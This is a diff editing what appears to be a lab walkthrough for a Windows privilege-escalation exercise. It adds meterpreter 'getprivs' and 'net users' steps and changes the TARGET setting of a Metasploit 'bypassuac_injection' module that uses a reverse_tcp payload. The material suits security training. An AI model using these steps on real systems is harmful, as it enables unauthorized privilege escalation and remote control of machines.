@@ -79,10 +79,14 @@ migrate 2124
 
 ![Content Image](https://assets.ine.com/lab/learningpath/277cc6e33ce8bf27515e05ad72d003d8aab11698849819d2bdce667ea960329f.jpg)
 
+Found the privileges have our user
+```
+getprivs 
+```
+
 **Step 9:** Elevate to the high privilege:
 
 **Command**:
-
 ```
 getsystem
 ```
@@ -91,10 +95,14 @@ getsystem
 
 We can observe that we do not have permission to elevate privileges.
 
+Find users on the system
+```
+net users 
+```
+
 **Step 10:** Get a windows shell and check if the admin user is a member of the Administrators group.
 
 **Commands:**
-
 ```
 shell
 net localgroup administrators
@@ -128,7 +136,7 @@ background
 ```bash
 use exploit/windows/local/bypassuac_injection
 set session 1
-set TARGET 1
+set TARGET Windows\ x64
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 exploit
 ```
